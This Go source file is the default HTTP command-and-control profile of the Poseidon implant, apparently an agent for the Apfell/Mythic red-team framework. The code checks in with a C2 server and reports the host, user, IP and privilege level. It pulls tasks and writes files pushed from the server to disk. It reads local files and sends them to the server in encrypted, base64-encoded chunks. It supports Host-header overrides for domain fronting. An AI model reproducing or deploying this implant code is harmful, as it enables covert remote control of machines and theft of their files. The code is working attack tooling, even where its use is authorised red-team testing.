// +build default

package profiles

import (
	"bytes"
	"crypto/rsa"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/xorrior/poseidon/pkg/utils/crypto"
	"github.com/xorrior/poseidon/pkg/utils/functions"
	"github.com/xorrior/poseidon/pkg/utils/structs"
)

type C2Default struct {
	HostHeader     string
	BaseURL        string
	BaseURLs       []string
	Interval       int
	Commands       []string
	ExchangingKeys bool
	ApfellID       string
	UserAgent      string
	UUID           string
	AesPSK         string
	RsaPrivateKey  *rsa.PrivateKey
}

func newProfile() Profile {
	return &C2Default{}
}

func (c C2Default) Header() string {
	return c.HostHeader
}

func (c *C2Default) SetHeader(newHeader string) {
	c.HostHeader = newHeader
}

func (c C2Default) URL() string {
	if len(c.BaseURLs) == 0 {
		return c.BaseURL
	} else {
		return c.getRandomBaseURL()
	}
}

func (c *C2Default) getRandomBaseURL() string {
	return c.BaseURLs[seededRand.Intn(len(c.BaseURLs))]
}

func (c *C2Default) SetURL(newURL string) {
	c.BaseURL = newURL
}

func (c *C2Default) SetURLs(newURLs []string) {
	c.BaseURLs = newURLs
}

func (c C2Default) SleepInterval() int {
	return c.Interval
}

func (c *C2Default) SetSleepInterval(interval int) {
	c.Interval = interval
}

func (c C2Default) C2Commands() []string {
	return c.Commands
}

func (c *C2Default) SetC2Commands(commands []string) {
	c.Commands = commands
}

func (c C2Default) XKeys() bool {
	return c.ExchangingKeys
}

func (c *C2Default) SetXKeys(xkeys bool) {
	c.ExchangingKeys = xkeys
}

func (c C2Default) ApfID() string {
	return c.ApfellID
}

func (c *C2Default) SetApfellID(newApf string) {
	c.ApfellID = newApf
}

func (c C2Default) UniqueID() string {
	return c.UUID
}

func (c *C2Default) SetUniqueID(newID string) {
	c.UUID = newID
}

func (c *C2Default) SetUserAgent(ua string) {
	c.UserAgent = ua
}

func (c C2Default) GetUserAgent() string {
	return c.UserAgent
}

func (c C2Default) AesPreSharedKey() string {
	return c.AesPSK
}

func (c *C2Default) SetAesPreSharedKey(newKey string) {
	c.AesPSK = newKey
}

func (c C2Default) RsaKey() *rsa.PrivateKey {
	return c.RsaPrivateKey
}

func (c *C2Default) SetRsaKey(newKey *rsa.PrivateKey) {
	c.RsaPrivateKey = newKey
}

// CheckIn - check in a new agent
func (c *C2Default) CheckIn(ip string, pid int, user string, host string) interface{} {
	var resp []byte
	c.ApfellID = c.UUID
	checkin := structs.CheckInMessage{}
	checkin.Action = "checkin"
	checkin.User = user
	checkin.Host = host
	checkin.IP = ip
	checkin.Pid = pid
	checkin.UUID = c.UUID
	if functions.IsElevated() {
		checkin.IntegrityLevel = 3
	} else {
		checkin.IntegrityLevel = 2
	}

	if c.ExchangingKeys { // If exchangingKeys == true, then start EKE
		_ = c.NegotiateKey()
	}

	raw, _ := json.Marshal(checkin)
	endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
	resp = c.htmlPostData(endpoint, raw)

	// save the apfell id
	response := structs.CheckInMessageResponse{}
	err := json.Unmarshal(resp, &response)

	if err != nil {
		log.Printf("Error in unmarshal:\n %s", err.Error())
	}

	if len(response.ID) != 0 {
		//log.Printf("Saving new UUID: %s\n", response.ID)
		c.ApfellID = response.ID
	}

	return response
}

//GetTasking - retrieve new tasks
func (c *C2Default) GetTasking() interface{} {

	url := fmt.Sprintf("%sapi/v%s/agent_message", c.BaseURL, ApiVersion)
	//request := structs.Msg{}
	request := structs.TaskRequestMessage{}
	request.Action = "get_tasking"
	request.TaskingSize = 1

	raw, err := json.Marshal(request)

	if err != nil {
		log.Printf("Error unmarshalling: %s", err.Error())
	}

	rawTask := c.htmlGetData(url, raw)

	task := structs.TaskRequestMessageResponse{}
	err = json.Unmarshal(rawTask, &task)

	if err != nil {
		log.Printf("Error unmarshalling task data: %s", err.Error())
	}

	return task
}

//PostResponse - Post task responses
func (c *C2Default) PostResponse(task structs.Task, output string) []byte {

	endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
	return c.postRESTResponse(endpoint, task, []byte(output))
}

//postRESTResponse - Wrapper to post task responses through the Apfell rest API
func (c *C2Default) postRESTResponse(urlEnding string, task structs.Task, data []byte) []byte {

	size := len(data)
	const dataChunk = 512000 //Normal apfell chunk size
	r := bytes.NewBuffer(data)
	chunks := uint64(math.Ceil(float64(size) / dataChunk))
	var retData bytes.Buffer
	//log.Println("Chunks: ", chunks)
	for i := uint64(0); i < chunks; i++ {
		dataPart := int(math.Min(dataChunk, float64(int64(size)-int64(i*dataChunk))))
		dataBuffer := make([]byte, dataPart)

		_, err := r.Read(dataBuffer)
		if err != nil {
			fmt.Sprintf("Error reading %s: %s", err)
			break
		}

		responseMsg := structs.TaskResponseMessage{}
		responseMsg.Action = "post_response"
		responseMsg.Responses = make([]json.RawMessage, 1)
		responseMsg.Responses[0] = dataBuffer

		dataToSend, err := json.Marshal(responseMsg)
		if err != nil {
			log.Printf("Error marshaling data for postRESTResponse: %s", err.Error())
			return make([]byte, 0)
		}
		ret := c.htmlPostData(urlEnding, dataToSend)
		retData.Write(ret)
	}

	return retData.Bytes()
}

//htmlPostData HTTP POST function
func (c *C2Default) htmlPostData(endpoint string, sendData []byte) []byte {
	url := fmt.Sprintf("%s%s", c.BaseURL, endpoint)

	// If the AesPSK is set, encrypt the data we send
	if len(c.AesPSK) != 0 {
		//log.Printf("Encrypting Post data")
		sendData = EncryptMessage(sendData, c.AesPSK)

	}

	sendData = append([]byte(c.ApfellID), sendData...) // Prepend the UUID

	sendData = []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
	if err != nil {
		log.Printf("Error creating new http request: %s", err.Error())
		return make([]byte, 0)
	}
	contentLength := len(sendData)
	req.ContentLength = int64(contentLength)
	req.Header.Set("User-Agent", c.UserAgent)
	// Set the host header if not empty
	if len(c.HostHeader) > 0 {

		req.Host = c.HostHeader
	}

	client := &http.Client{}
	resp, err := client.Do(req)

	if err != nil {
		log.Printf("Error completing POST request %s", err.Error())
		return make([]byte, 0)
	}

	if resp.StatusCode != 200 {
		//log.Printf("Did not receive 200 response code: %s", resp.StatusCode)
		return make([]byte, 0)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Printf("Error reading response body: %s", err.Error())
		return make([]byte, 0)
	}

	raw, err := base64.StdEncoding.DecodeString(string(body))
	if err != nil {
		log.Println("Error decoding base64 data: ", err.Error())
		return make([]byte, 0)
	}

	enc_raw := raw[36:] // Remove the Payload UUID

	// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
		//log.Printf("Decrypting data")
		return DecryptMessage(enc_raw, c.AesPSK)

	}

	return enc_raw
}

//htmlGetData - HTTP GET request for data
func (c *C2Default) htmlGetData(url string, body []byte) []byte {

	client := &http.Client{}

	if len(c.AesPSK) > 0 && len(body) > 0 {
		body = EncryptMessage(body, c.AesPSK) // Encrypt and then encapsulate the task request
	}

	encapbody := append([]byte(c.ApfellID), body...)                          // Prepend the UUID to the body of the request
	encbody := base64.StdEncoding.EncodeToString(encapbody)                   // Base64 the body
	req, err := http.NewRequest("GET", url, bytes.NewBuffer([]byte(encbody))) // Make the new request
	if err != nil {
		log.Println("Error creating GET request: ", err.Error())
		return make([]byte, 0)
	}

	if len(c.HostHeader) > 0 {
		//req.Header.Set("Host", c.HostHeader)
		req.Host = c.HostHeader // Change the host header if specified
	}

	req.Header.Set("User-Agent", c.UserAgent)
	resp, err := client.Do(req)

	if err != nil {
		log.Println("Error completing GET request: ", err.Error())
		return make([]byte, 0)
	}

	if resp.StatusCode != 200 {
		//log.Println("Did not receive 200 response code: ", resp.StatusCode)
		return make([]byte, 0)
	}

	defer resp.Body.Close()

	body, _ = ioutil.ReadAll(resp.Body)
	raw, err := base64.StdEncoding.DecodeString(string(body)) // Remove the base64
	if err != nil {
		log.Println("Error decoding data ", err.Error())
		return make([]byte, 0)
	}
	enc_raw := raw[36:] // Remove the prepended UUID

	if len(c.AesPSK) != 0 && c.ExchangingKeys != true {
		//return c.decryptMessage(respBody)
		return DecryptMessage(enc_raw, c.AesPSK) // If the AES PSK is set, decrypt the response body and return
	}

	return enc_raw

}

//NegotiateKey - EKE key negotiation
func (c *C2Default) NegotiateKey() string {
	sessionID := GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	// Replace struct with dynamic json
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)

	if err != nil {
		log.Printf("Error marshaling data: %s", err.Error())
		return ""
	}

	endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion) // Send the request to the EKE endpoint

	resp := c.htmlPostData(endpoint, raw)

	decryptedResponse := crypto.RsaDecryptCipherBytes(resp, c.RsaKey()) // Decrypt & Unmarshal the response
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err = json.Unmarshal(decryptedResponse, &sessionKeyResp)

	if err != nil {
		log.Printf("Error unmarshaling RsaResponse: %s", err.Error())
		return ""
	}

	c.AesPSK = sessionKeyResp.SessionKey // Save the new AES session key
	c.ExchangingKeys = false

	if len(sessionKeyResp.UUID) > 0 {
		c.ApfellID = sessionKeyResp.UUID // Save the new UUID
	}

	//log.Printf("Config after key exchange: %#v", c)
	return sessionID
}

//SendFile - download a file
func (c *C2Default) SendFile(task structs.Task, params string) {

	path := task.Params
	// Get the file size first and then the # of chunks required
	file, err := os.Open(path)

	if err != nil {
		log.Println("Error opening file: ", err.Error())
		return
	}

	fi, err := file.Stat()
	if err != nil {
		log.Println("Error obtaining file stat: ", err.Error())
		return
	}

	size := fi.Size()
	raw := make([]byte, size)
	_, err = file.Read(raw)
	if err != nil {
		log.Println("Error reading file: ", err.Error())
		return
	}
	c.SendFileChunks(task, raw)
}

// Get a file

func (c *C2Default) GetFile(fileDetails structs.FileUploadParams) bool {
	success := false
	url := fmt.Sprintf("api/v%s/agent_message", ApiVersion)
	fileUploadMsg := structs.FileUploadChunkMessage{} //Create the file upload chunk message
	fileUploadMsg.Action = "upload"
	fileUploadMsg.FileID = fileDetails.FileID
	fileUploadMsg.ChunkSize = 1024000
	fileUploadMsg.ChunkNum = 1
	fileUploadMsg.FullPath = fileDetails.RemotePath

	msg, _ := json.Marshal(fileUploadMsg)
	rawData := c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url), msg)

	fileUploadMsgResponse := structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
	_ = json.Unmarshal(rawData, &fileUploadMsgResponse)

	f, err := os.Create(fileDetails.RemotePath)
	if err != nil {
		log.Printf("Error creating file: %s", err.Error())
		return success
	}
	decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)

	_, err = f.Write(decoded)

	if err != nil {
		log.Printf("Error writing to file: %s", err.Error())
		return success
	}

	success = true
	if fileUploadMsgResponse.TotalChunks > 1 {
		for index := 2; index <= fileUploadMsgResponse.TotalChunks; index++ {
			fileUploadMsg = structs.FileUploadChunkMessage{}
			fileUploadMsg.Action = "upload"
			fileUploadMsg.ChunkNum = index
			fileUploadMsg.ChunkSize = 1024000
			fileUploadMsg.FileID = fileDetails.FileID
			fileUploadMsg.FullPath = fileDetails.RemotePath

			msg, _ := json.Marshal(fileUploadMsg)
			rawData := c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url), msg)
			fileUploadMsgResponse = structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
			_ = json.Unmarshal(rawData, &fileUploadMsgResponse)

			decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)

			_, err := f.Write(decoded)

			if err != nil {
				log.Printf("Error writing to file: %s", err.Error())
				success = false
				break
			}
		}
	}

	return success

}

//SendFileChunks - Helper function to deal with file chunks (screenshots and file downloads)
func (c *C2Default) SendFileChunks(task structs.Task, fileData []byte) {

	size := len(fileData)

	const fileChunk = 512000 //Normal apfell chunk size
	chunks := uint64(math.Ceil(float64(size) / fileChunk))

	chunkResponse := structs.FileDownloadInitialMessage{}
	chunkResponse.NumChunks = int(chunks)
	chunkResponse.TaskID = task.TaskID
	chunkResponse.FullPath = task.Params

	msg, err := json.Marshal(chunkResponse)
	if err != nil {
		log.Println("Error unmarshaling intial chunk message: ", err.Error())
	}
	resp := c.PostResponse(task, string(msg))
	fileResp := structs.TaskResponseMessageResponse{}

	err = json.Unmarshal(resp, &fileResp)

	if err != nil {
		log.Printf("Error unmarshaling: %s", err.Error())
		return
	}

	var fileDetails map[string]interface{}

	if len(fileResp.Responses) > 0 {
		_ = json.Unmarshal([]byte(fileResp.Responses[0]), &fileDetails)
	}
	r := bytes.NewBuffer(fileData)
	// Sleep here so we don't spam apfell
	time.Sleep(time.Duration(c.Interval) * time.Second)
	for i := uint64(0); i < chunks; i++ {

		partSize := int(math.Min(fileChunk, float64(int64(size)-int64(i*fileChunk))))
		partBuffer := make([]byte, partSize)
		// Create a temporary buffer and read a chunk into that buffer from the file
		read, err := r.Read(partBuffer)
		if err != nil || read == 0 {
			log.Printf("Error reading from buffer: %s", err.Error())
			break
		}

		msg := structs.FileDownloadChunkMessage{}
		msg.ChunkNum = int(i) + 1
		msg.FileID = fileDetails["file_id"].(string)
		msg.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
		msg.TaskID = task.TaskID

		encmsg, err := json.Marshal(msg)
		if err != nil {
			log.Println("Error Marshaling chunk message: ", err.Error())
			break
		}
		taskResp := structs.TaskResponseMessage{}
		taskResp.Action = "post_response"
		taskResp.Responses = make([]json.RawMessage, 1)
		taskResp.Responses[0] = encmsg
		dataToSend, err := json.Marshal(taskResp)
		if err != nil {
			log.Println("Error marshaling task response message: ", err.Error())
			break
		}

		endpoint := fmt.Sprintf("api/v%s/agent_message", ApiVersion) // TODO: update this for 1.4
		resp := c.htmlPostData(endpoint, dataToSend)
		postResp := structs.TaskResponseMessageResponse{}

		err = json.Unmarshal(resp, &postResp)
		if err != nil {
			log.Println("Error unmarshaling task response message response: ", err.Error())
			break
		}

		var decResp map[string]interface{}
		if len(postResp.Responses) > 0 {
			_ = json.Unmarshal(postResp.Responses[0], &decResp)
		}

		if !strings.Contains(decResp["status"].(string), "success") {
			// If the post was not successful, wait and try to send it one more time
			time.Sleep(time.Duration(c.Interval) * time.Second)
			resp = c.htmlPostData(endpoint, dataToSend)
		}
		time.Sleep(time.Duration(c.Interval) * time.Second)
	}

	final := structs.Response{}
	final.Completed = true
	final.TaskID = task.TaskID
	final.UserOutput = "file downloaded"
	finalEnc, _ := json.Marshal(final)
	c.PostResponse(task, string(finalEnc))
}
